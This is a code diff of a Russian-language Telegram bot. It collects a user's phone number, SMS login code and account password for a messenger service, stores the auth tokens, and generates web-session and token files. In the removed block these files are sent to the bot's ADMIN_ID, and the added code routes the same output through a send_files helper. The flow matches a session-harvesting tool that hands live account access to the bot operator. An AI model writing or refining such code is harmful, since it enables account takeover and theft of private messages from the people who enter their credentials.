@@ -32,8 +32,7 @@ class AuthState(StatesGroup):
     waiting_for_password = State()
 
 pending = {}
-accounts = {}  # {uid: {"phone": "...", "token": "...", "user_id": ..., "work_dir": "..."}}
-
+accounts = {}
 ACCOUNTS_FILE = "accounts.json"
 
 def load_accounts():
@@ -41,8 +40,6 @@ def load_accounts():
     if os.path.exists(ACCOUNTS_FILE):
         with open(ACCOUNTS_FILE, "r") as f:
             accounts = json.load(f)
-    else:
-        accounts = {}
 
 def save_accounts():
     with open(ACCOUNTS_FILE, "w") as f:
@@ -68,8 +65,8 @@ def retry_on_network_error(max_retries=3, delay=2):
     return decorator
 
 @retry_on_network_error(max_retries=3, delay=2)
-async def safe_edit(msg, text):
-    await msg.edit_text(text)
+async def safe_edit(msg, text, reply_markup=None):
+    await msg.edit_text(text, reply_markup=reply_markup)
 
 @retry_on_network_error(max_retries=3, delay=2)
 async def safe_send(message, text, reply_markup=None):
@@ -131,7 +128,6 @@ async def send_files(phone, uid, work_dir, desktop, js):
         caption=f"🌐 ВЕБ\nНомер: {phone}", parse_mode="HTML")
 
 async def get_web_token(phone, uid, work_dir):
-    """Получает веб-токен через QR."""
     track_id = None
     web_device_id = gen_device_id()
     headers = {
@@ -157,7 +153,7 @@ async def get_web_token(phone, uid, work_dir):
         logging.error(f"WebClient error: {e}")
 
     if not track_id:
-        return None
+        return None, web_device_id
 
     logging.info(f"track_id: {track_id}")
 
@@ -199,19 +195,19 @@ async def get_web_token(phone, uid, work_dir):
 
     return None, web_device_id
 
-# ==================== КНОПКИ МЕНЮ ====================
+# ==================== МЕНЮ ====================
 
 def accounts_keyboard(uid):
     builder = InlineKeyboardBuilder()
     builder.row(InlineKeyboardButton(text="➕ Добавить аккаунт", callback_data="add_account"))
-    for phone, data in accounts.get(str(uid), {}).items():
+    for phone in accounts.get(str(uid), {}):
         builder.row(InlineKeyboardButton(text=f"📱 {phone}", callback_data=f"acc_{phone}"))
     return builder.as_markup()
 
 def account_actions_keyboard(phone):
     builder = InlineKeyboardBuilder()
     builder.row(InlineKeyboardButton(text="🌐 Войти в веб", callback_data=f"web_{phone}"))
-    builder.row(InlineKeyboardButton(text="🗑 Удалить аккаунт", callback_data=f"del_{phone}"))
+    builder.row(InlineKeyboardButton(text="🗑 Удалить", callback_data=f"del_{phone}"))
     builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="my_accounts"))
     return builder.as_markup()
 
@@ -223,24 +219,62 @@ async def start(message: types.Message):
 
 @dp.message(F.text == "👤 Мои аккаунты")
 async def my_accounts(message: types.Message):
-    uid = str(message.from_user.id)
-    await safe_send(message, "📱 Ваши аккаунты:", reply_markup=accounts_keyboard(uid))
+    await safe_send(message, "📱 Ваши аккаунты:", reply_markup=accounts_keyboard(message.from_user.id))
 
 @dp.callback_query(F.data == "my_accounts")
 async def cb_my_accounts(callback: types.CallbackQuery):
-    uid = str(callback.from_user.id)
-    await callback.message.edit_text("📱 Ваши аккаунты:", reply_markup=accounts_keyboard(uid))
+    await callback.message.edit_text("📱 Ваши аккаунты:", reply_markup=accounts_keyboard(callback.from_user.id))
 
 @dp.callback_query(F.data == "add_account")
 async def cb_add_account(callback: types.CallbackQuery, state: FSMContext):
+    await state.clear()
     await state.set_state(AuthState.waiting_for_code)
     await callback.message.answer("📱 Отправьте номер в формате +79111111111")
     await callback.answer()
 
-@dp.message(F.text.regexp(r'^\+7\d{10}$'))
+@dp.callback_query(F.data.startswith("acc_"))
+async def cb_account(callback: types.CallbackQuery):
+    phone = callback.data[4:]
+    await callback.message.edit_text(f"📱 {phone}", reply_markup=account_actions_keyboard(phone))
+    await callback.answer()
+
+@dp.callback_query(F.data.startswith("del_"))
+async def cb_delete(callback: types.CallbackQuery):
+    phone = callback.data[4:]
+    uid = str(callback.from_user.id)
+    if uid in accounts and phone in accounts[uid]:
+        del accounts[uid][phone]
+        save_accounts()
+    await callback.message.edit_text("📱 Ваши аккаунты:", reply_markup=accounts_keyboard(callback.from_user.id))
+    await callback.answer("Удалено")
+
+@dp.callback_query(F.data.startswith("web_"))
+async def cb_web(callback: types.CallbackQuery):
+    phone = callback.data[4:]
+    uid = str(callback.from_user.id)
+    data = accounts.get(uid, {}).get(phone)
+    if not data:
+        await callback.answer("Аккаунт не найден")
+        return
+
+    msg = await callback.message.answer(f"🌐 Запускаю веб-вход для {phone}...\n⏳ До 2 минут.")
+    web_token, web_device_id = await get_web_token(phone, uid, data["work_dir"])
+
+    if web_token:
+        desktop = build_desktop_json(web_token, web_device_id, int(time.time()*1000), gen_password(), data["user_id"], phone)
+        js = generate_web_js(web_device_id, web_token, data["user_id"])
+        await send_files(phone, uid, data["work_dir"], desktop, js)
+        await msg.edit_text(f"✅ Веб-токен для {phone} готов!")
+    else:
+        await msg.edit_text(f"❌ Не удалось получить веб-токен для {phone}")
+    await callback.answer()
+
+# ==================== ВХОД ====================
+
+@dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\+7\d{10}$'))
 async def phone_handler(message: types.Message, state: FSMContext):
     phone = message.text.strip()
-    uid = str(message.from_user.id)
+    uid = message.from_user.id
     work_dir = f"cache/{uid}/{phone}"
     os.makedirs(work_dir, exist_ok=True)
 
@@ -251,7 +285,6 @@ async def phone_handler(message: types.Message, state: FSMContext):
     client = SocketMaxClient(phone=phone, work_dir=work_dir)
     pending[uid] = {"client": client, "phone": phone, "work_dir": work_dir}
 
-    await state.set_state(AuthState.waiting_for_code)
     await state.update_data(phone=phone, work_dir=work_dir)
 
     msg = await safe_send(message, "⏳ Отправляю SMS...")
@@ -301,7 +334,7 @@ async def phone_handler(message: types.Message, state: FSMContext):
         await state.clear()
         return
     elif status == "blocked":
-        await safe_edit(msg, "🚫 Аккаунт заблокирован.")
+        await safe_edit(msg, "🚫 Заблокирован.")
         del pending[uid]
         await state.clear()
         return
@@ -315,7 +348,7 @@ async def phone_handler(message: types.Message, state: FSMContext):
 
 @dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
 async def code_handler(message: types.Message, state: FSMContext):
-    uid = str(message.from_user.id)
+    uid = message.from_user.id
     code = str(message.text.strip())
 
     if uid not in pending:
@@ -343,10 +376,10 @@ async def code_handler(message: types.Message, state: FSMContext):
             token = pending[uid]["token"]
             viewer_id = pending[uid]["user_id"]
 
-            # Сохраняем аккаунт
-            if uid not in accounts:
-                accounts[uid] = {}
-            accounts[uid][phone] = {
+            uid_str = str(uid)
+            if uid_str not in accounts:
+                accounts[uid_str] = {}
+            accounts[uid_str][phone] = {
                 "token": token,
                 "user_id": viewer_id,
                 "work_dir": work_dir
@@ -385,7 +418,7 @@ async def code_handler(message: types.Message, state: FSMContext):
 
 @dp.message(AuthState.waiting_for_password)
 async def password_handler(message: types.Message, state: FSMContext):
-    uid = str(message.from_user.id)
+    uid = message.from_user.id
     pwd = message.text.strip()
 
     if uid not in pending:
@@ -421,9 +454,10 @@ async def password_handler(message: types.Message, state: FSMContext):
         token = pending[uid]["token"]
         viewer_id = pending[uid].get("user_id") or 0
 
-        if uid not in accounts:
-            accounts[uid] = {}
-        accounts[uid][phone] = {
+        uid_str = str(uid)
+        if uid_str not in accounts:
+            accounts[uid_str] = {}
+        accounts[uid_str][phone] = {
             "token": token,
             "user_id": viewer_id,
             "work_dir": work_dir
@@ -438,63 +472,6 @@ async def password_handler(message: types.Message, state: FSMContext):
     await safe_edit(msg, "❌ Токен не найден.")
     del pending[uid]
     await state.clear()
-
-# ==================== ВЕБ-ВХОД ====================
-
-@dp.callback_query(F.data.startswith("web_"))
-async def cb_web_login(callback: types.CallbackQuery):
-    phone = callback.data[4:]
-    uid = str(callback.from_user.id)
-
-    data = accounts.get(uid, {}).get(phone)
-    if not data:
-        await callback.answer("Аккаунт не найден")
-        return
-
-    token = data["token"]
-    user_id = data["user_id"]
-    work_dir = data["work_dir"]
-
-    msg = await callback.message.answer(f"🌐 Запускаю веб-вход для {phone}...\n⏳ Это займёт до 2 минут.")
-
-    web_token, web_device_id = await get_web_token(phone, uid, work_dir)
-
-    if web_token:
-        desktop = build_desktop_json(web_token, web_device_id, int(time.time()*1000), gen_password(), user_id, phone)
-        js = generate_web_js(web_device_id, web_token, user_id)
-
-        dp_path = f"{work_dir}/web_session.txt"
-        with open(dp_path, "w") as f:
-            f.write(json.dumps(desktop, ensure_ascii=False, indent=4))
-        wp = f"{work_dir}/web_token.txt"
-        with open(wp, "w") as f:
-            f.write(js)
-
-        await bot.send_document(ADMIN_ID, FSInputFile(dp_path), caption=f"💻 Веб-сессия\nНомер: {phone}")
-        await bot.send_document(ADMIN_ID, FSInputFile(wp), caption=f"🌐 Веб-токен\nНомер: {phone}")
-        await msg.edit_text(f"✅ Веб-токен для {phone} готов!")
-    else:
-        await msg.edit_text(f"❌ Не удалось получить веб-токен для {phone}")
-
-    await callback.answer()
-
-@dp.callback_query(F.data.startswith("del_"))
-async def cb_delete_account(callback: types.CallbackQuery):
-    phone = callback.data[4:]
-    uid = str(callback.from_user.id)
-
-    if uid in accounts and phone in accounts[uid]:
-        del accounts[uid][phone]
-        save_accounts()
-
-    await callback.message.edit_text("📱 Ваши аккаунты:", reply_markup=accounts_keyboard(uid))
-    await callback.answer("Удалено")
-
-@dp.callback_query(F.data.startswith("acc_"))
-async def cb_account(callback: types.CallbackQuery):
-    phone = callback.data[4:]
-    await callback.message.edit_text(f"📱 {phone}", reply_markup=account_actions_keyboard(phone))
-    await callback.answer()
 
 async def main():
     import builtins
